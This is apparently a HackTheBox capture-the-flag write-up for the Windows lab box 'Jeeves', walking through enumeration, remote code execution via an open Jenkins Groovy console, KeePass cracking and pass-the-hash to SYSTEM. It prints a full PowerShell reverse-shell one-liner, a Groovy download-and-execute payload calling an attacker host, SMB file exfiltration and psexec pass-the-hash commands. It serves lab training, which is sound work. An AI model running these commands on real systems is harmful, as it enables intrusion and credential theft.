---
title: "[EN] - HackTheBox: Jeeves Write-Up"
date: 2026-01-07 11:07:00 +0700
categories: [HackTheBox, Boxes, Medium, Windows]
tags: [Jenkins, Groovy script, Keepass, Pass-the-Hash, Alternate Data Stream]
description: Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.
image: /assets/img/HTB-Jeeves_banner.png
---

## Enumeration

### Open TCP Ports

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ nmap -sVC -p- -T4 -oN nmap/TCP_all_services.nmap 10.129.33.221
# Nmap <REDACTED> scan initiated Wed Jan  7 11:42:10 2026 as: nmap -sVC -p- -T4 -oN nmap/TCP_all_services.nmap 10.129.33.221
Nmap scan report for 10.129.33.221
Host is up (0.055s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2026-01-07T15:42:28
|_  start_date: 2026-01-07T15:36:48
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m01s, deviation: 0s, median: 5h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan  7 11:43:04 2026 -- 1 IP address (1 host up) scanned in 53.84 seconds
```

The initial Nmap scan revealed four open ports : HTTP services on **80** and **50000**, along with **SMB (445)** and **RPC (135)** on the standard Windows ports. 
Port 80 hosts a ``Microsoft IIS 10.0`` server titled "**Ask Jeeves**" while port 50000 runs ``Jetty 9.4.z-SNAPSHOT``. 
The SMB information indicated the host was named JEEVES within the WORKGROUP domain and had message signing enabled but not required.

### Directory Listing

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ ffuf -ic -w `fzf-wordlists` -u http://10.129.33.221:50000/FUZZ

<SNIP>
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.33.221:50000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

askjeeves        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 47ms]
```

Running Ffuf against the Jetty service on port **50000** uncovered the directory ``/askjeeves``. 

---

# Initial Access

After finding the ``/askjeeves`` directory with FFUF, we navigate to ``http://10.129.33.221:50000/askjeeves`` and discover that the admin panel requires no password.

![](/assets/img/HTB-Jeeves_1.png)

From there, we access the Script Console (Groovy) feature, which allows us to execute system commands on the target host.

![](/assets/img/HTB-Jeeves_2.png)

To get a reverse shell, we copy Nishang's one-liner ([Invoke-PowerShellTcpOneLine.ps1](https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1)) and serve it over HTTP :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1 -O shell.ps1

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ cat shell.ps1
$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

With a Netcat listener running on port **9001** :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ rlwrap ncat -lvnp 9001
```

We trigger execution through the following Groovy payload, which instructs the target to download and run our shell :

```groovy
def cmd = "powershell.exe -C IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/shell.ps1')".execute();
println("${cmd.text}");
```

![](/assets/img/HTB-Jeeves_3.png)

The shell comes back, confirming code execution as ``kohsuke`` :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ rlwrap ncat -lvnp 9001
Ncat: Version <REDACTED> ( https://nmap.org/ncat )
Ncat: Listening on [::]:9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.33.221:49679.

PS C:\Users\Administrator\.jenkins> whoami
jeeves\kohsuke
PS C:\> cat c:\Users\kohsuke\Desktop\user.txt
e323XXXXXXXXXXXXXXXXXXXXXXX7066a
```

---

## Privilege Escalation
### kohsuke -> Administrator

Once a foothold was obtained, listing files recursively in kohsuke's home directory reveals a KeePass database file (``CEH.kdbx``) in his Documents folder :

```shell
PS C:\Users\Administrator\.jenkins> gci -recurse c:\users\kohsuke

<SNIP>

    Directory: C:\users\kohsuke\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx

<SNIP>
```

We transfer ``CEH.kdbx`` back to the attacking machine using Impacket's SMB server :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ impacket-smbserver -smb2support share $(pwd)
<SNIP>

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```shell
PS C:\Users\Administrator\.jenkins> copy C:\users\kohsuke\Documents\CEH.kdbx \\<ATTACKER_IP>\share
```

With the file in hand, we extract its hash using keepass2john and feed it to John the Ripper, which cracks the master password as moonshine1.

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ file CEH.kdbx
CEH.kdbx: Keepass password database 2.x KDBX

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ keepass2john CEH.kdbx > CEH.hash

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ cat CEH.hash
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ john --wordlist=/usr/share/wordlists/rockyou.txt CEH.hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)
1g 0:00:00:11 DONE (2026-01-07 15:14) 0.08517g/s 4682p/s 4682c/s 4682C/s nick18..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Opening the database with kpcli and browsing its entries, the "**Backup stuff**" entry immediately stands out. Its password field contains what appears to be an NTLM hash in ``<LM>:<NT>`` format. 
The LM portion (``aad3b435b51404eeaad3b435b51404ee``) is the well-known empty LM hash, meaning only the NT half (``e0fbXXXXXXXXXXXXXXXXXXXXXXX1fe00``) carries any value.

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ kpcli --kdb=CEH.kdbx
Provide the master password: *************************

<SNIP>

kpcli:/> ls
=== Groups ===
CEH/
kpcli:/> cd CEH/
kpcli:/CEH> ls

<SNIP>

=== Entries ===
0. Backup stuff
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom
7. Walmart.com                                             www.walmart.com
   
kpcli:/CEH> show -f "Backup stuff"

 Path: /CEH/
Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fbXXXXXXXXXXXXXXXXXXXXXXX1fe00
  URL:
Notes:
```

Testing that NT hash against the ``administrator`` account with NetExec confirms it is valid and grants administrative access.

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ nxc smb 10.129.33.221 -u 'administrator' -H 'e0fbXXXXXXXXXXXXXXXXXXXXXXX1fe00'
SMB         10.129.33.221   445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.33.221   445    JEEVES           [+] Jeeves\administrator:e0fbXXXXXXXXXXXXXXXXXXXXXXX1fe00 (Pwn3d!)
```

Passing the hash through Impacket's psexec.py spawns a shell as ``NT AUTHORITY\SYSTEM`` :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Jeeves]
└──╼ [★]$ psexec.py 'administrator@10.129.33.221' -hashes 'aad3b435b51404eeaad3b435b51404ee:e0fbXXXXXXXXXXXXXXXXXXXXXXX1fe00'
<SNIP>

[*] Requesting shares on 10.129.33.221.....
[*] Found writable share ADMIN$
[*] Uploading file GSEieEtA.exe
[*] Opening SVCManager on 10.129.33.221.....
[*] Creating service buYl on 10.129.33.221.....
[*] Starting service buYl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

---

### Searching the Root flag

After obtaining a SYSTEM shell, we navigated as usual into the Administrator's desktop looking for the root flag. Unfortunately there was no root flag but a file named ``hm.txt``.
The ``hm.txt`` file hints that the flag is hidden elsewhere. Listing the directory with ``/R`` to reveal Alternate Data Streams (ADS) shows a hidden stream attached to ``hm.txt``.

```shell
C:\Windows\system32> cd c:\users\administrator\desktop
c:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```

Checking for Alternate Data Streams (ADS) in the directory revealed a hidden stream attached to ``hm.txt``.

```shell
c:\Users\Administrator\Desktop> dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\Administrator\Desktop

11/08/2017  09:05 AM    <DIR>          .
11/08/2017  09:05 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,589,532,160 bytes free
```

Reading the ADS directly yields the root flag.

```shell
c:\Users\Administrator\Desktop> more < hm.txt:root.txt
afbcXXXXXXXXXXXXXXXXXXXXXXX92530
```